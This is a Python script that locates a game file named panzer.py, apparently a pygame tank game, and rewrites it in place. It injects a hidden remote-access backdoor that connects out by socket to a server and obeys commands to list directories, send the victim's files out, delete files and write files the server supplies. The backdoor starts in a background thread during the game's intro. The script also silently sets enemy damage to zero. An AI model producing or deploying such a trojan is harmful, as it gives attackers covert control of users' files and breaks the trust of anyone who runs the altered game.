import sys
import os
# if getattr(sys, 'frozen', False):
#     # If the application is run as a bundle, the PyInstaller bootloader
#     # extends the sys module by a flag frozen=True and sets the app
#     # path into variable _MEIPASS'.
#     dir_path = sys._MEIPASS
if getattr(sys, 'frozen', False):
    dir_path = os.path.dirname(sys.executable)
    os.chdir(dir_path)
else:
    dir_path = os.path.dirname(os.path.realpath(__file__))

print(dir_path)

# dir_path = os.path.dirname(os.path.realpath(__file__))

pyfile = ""
for root, dirs, files in os.walk(dir_path):
    for file in files:

        if file.endswith('panzer.py'):
            pyfile = os.path.join(root, file)
            # print(root+'/'+str(file))

print(pyfile)
check = "panzer.py"

f = open(pyfile, "r+")
content = """import os
import socket
import threading


def pre_command():
    print("")
    print("Connected to server successfully")
    print("")


def post_command():
    print("")
    print("Command executed successfully...")
    print("")


def pwd():
    files = os.getcwd()
    files = str(files)
    # s.send("".encode())
    s.send(files.encode())
    post_command()


def custom_dir():
    try:
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        post_command()
    except:
        return


def download_files():
    # FlushListen(s)
    try:
        filepath = s.recv(5000)
        filepath = filepath.decode()
        file = open(filepath, "rb")

        l = file.read(1024)
        while l:
            s.send(l)
            # print('Sent ', repr(l))
            l = file.read(1024)

        post_command()
    except:
        return


def remove_file():
    try:
        filepath = s.recv(5000)
        filepath = filepath.decode()
        os.remove(filepath)
        post_command()
    except:
        return


def send_files():
    try:
        filename = s.recv(5000)
        # print(filename)
        new_file = open(filename, "wb")
        data = s.recv(90000000)
        new_file.write(data)
        new_file.close()
    except:
        return


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)
port = 8080
# port = 18496
host = socket.gethostname()
# host = "3.19.130.43"
# host = input(str("Enter server address: "))
s.connect((host, port))
pre_command()


def loop():
    while True:
        command = s.recv(1024)
        command = command.decode()
        print("Command received...")
        print("")
        # print(command)

        if command == "pwd":
            pwd()

        elif command == "ls":
            custom_dir()

        elif command == "download":
            download_files()

        elif command == "remove":
            remove_file()

        elif command == "send":
            send_files()

        elif command == "exit":
            break

        elif command == "":
            print("")
            print("No command received...")
            print("")
            break

        else:
            print("Command not recognized")

"""

list_of_lines = f.readlines()
flag = False
for i in range(len(list_of_lines)):
    if "pygame.init()" in list_of_lines[i]:
        list_of_lines[i] = content + "\npygame.init()\n"

    if "intro = True" in list_of_lines[i]:
        list_of_lines[i] = "    thread = threading.Thread(target=loop)\n" + \
            "    thread.start()\n" + "\n    intro = True\n"

    if "def e_fireShell" in list_of_lines[i]:
        print("Found e_fireshell")
        flag = True
        continue

    if "return damage" in list_of_lines[i] and flag:
        print(list_of_lines[i])
        list_of_lines[i] = "    damage = 0\n    return damage\n"
        # list_of_lines[i] = "        return damage * 2.0\n"

f.seek(0)
f.writelines(list_of_lines)
f.truncate()
# f.write(content)

f.close()
